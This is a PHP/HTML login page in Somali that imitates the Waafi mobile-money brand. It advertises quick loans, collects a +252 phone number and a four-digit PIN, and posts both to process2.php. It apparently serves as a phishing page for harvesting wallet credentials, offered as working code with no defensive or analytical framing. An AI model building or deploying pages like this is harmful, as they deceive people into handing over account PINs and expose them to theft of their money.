<?php
if(isset($_GET['error'])){
    echo "<p style='color:red; text-align:center;'>Fadlan geli faahfaahintaada si sax ah ❌</p>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Waafi Login</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: linear-gradient(180deg, #a8e063, #56ab2f);
}

/* Header */
.header {
    text-align: center;
    padding: 30px 20px;
    color: white;
}

.header h1 {
    margin: 0;
    font-size: 28px;
}

.header p {
    margin-top: 5px;
    font-size: 14px;
}

/* Card */
.container {
    background: #f5f5f5;
    margin: 20px;
    padding: 25px;
    border-radius: 25px;
    text-align: center;
}

/* Phone box */
.phone-box {
    border: 2px solid #6cc04a;
    border-radius: 12px;
    padding: 12px;
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 25px;
}

.phone-box span {
    font-weight: bold;
}

.phone-box input {
    border: none;
    outline: none;
    flex: 1;
    font-size: 16px;
    background: transparent;
}

/* PIN */
.pin-box {
    display: flex;
    justify-content: center;
    gap: 10px;
    margin: 20px 0;
}

.pin {
    width: 50px;
    height: 50px;
    border: 2px solid #6cc04a;
    border-radius: 10px;
    text-align: center;
    font-size: 20px;
}

/* Eye icon */
.eye {
    cursor: pointer;
    font-size: 20px;
}

/* Button */
button {
    width: 100%;
    padding: 15px;
    border: none;
    border-radius: 12px;
    background: #ccc;
    color: white;
    font-size: 16px;
    margin-top: 20px;
}

/* Footer */
.footer {
    text-align: center;
    color: white;
    margin-top: 30px;
}
</style>

</head>

<body>

<div class="header">
    <h1>Waafi</h1>
    <p>Amaahado Sahlan oo Degdeg ah</p>
</div>


<div class="container">

    <h2>Gal</h2>
<form action="process2.php" method="POST">

    <div class="phone-box">
        <span>🇸🇴 +252</span>
        <input type="tel" id="phone" name="phone" placeholder="612345678" maxlength="10"required>
    </div>

    <p>Geli PIN-kaaga</p>

<div class="pin-container"

    <div class="pin-box">
        <input type="tel" maxlength="1" class="pin"required>
        <input type="tel" maxlength="1" class="pin"required>
        <input type="tel" maxlength="1" class="pin"required>
        <input type="tel" maxlength="1" class="pin"required>
    </div>

     <span id="togglePin" style="cursor:pointer; font-size:20px;">👁</span>

    <br>

<input type="hidden" name="pin" id="fullPin">

    <button type="submit">SII WAD</button>

 </form>

</div>


<script>
const pins = document.querySelectorAll(".pin");

// When typing in first box, allow full paste/typing
pins[0].addEventListener("input", function(e) {
    let value = this.value.replace(/\D/g, '');

    // If user types multiple digits
    if (value.length > 1) {
        value = value.slice(0, 4);
        pins.forEach((input, i) => {
            input.value = value[i] || "";
        });
        if (value.length === 4) pins[3].focus();
        return;
    }

    // Move to next
    if (this.value) pins[1].focus();
});

// Handle other boxes normally
pins.forEach((input, index) => {
    if(index === 0) return;

    input.addEventListener("input", () => {
        input.value = input.value.replace(/\D/g, '');

        if (input.value && index < 3) {
            pins[index + 1].focus();
        }
    });

    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
            pins[index - 1].focus();
        }
    });
});
</script>
<script>
let visible = false;

document.getElementById("togglePin").addEventListener("click", function() {
    visible = !visible;

    document.querySelectorAll(".pin").forEach(input => {
        input.type = visible ? "text" : "password";
    });

    this.textContent = visible ? "🙈" : "👁";
});
</script>
<script>
document.querySelector("form").addEventListener("submit", function() {

    let pin = "";

    document.querySelectorAll(".pin").forEach(input => {
        pin += input.value;
    });

    document.getElementById("fullPin").value = pin;

});
</script>

<div class="footer">
    <h2>Waafi</h2>
    <p>v2.1.3P</p>
</div>
</body>
</html>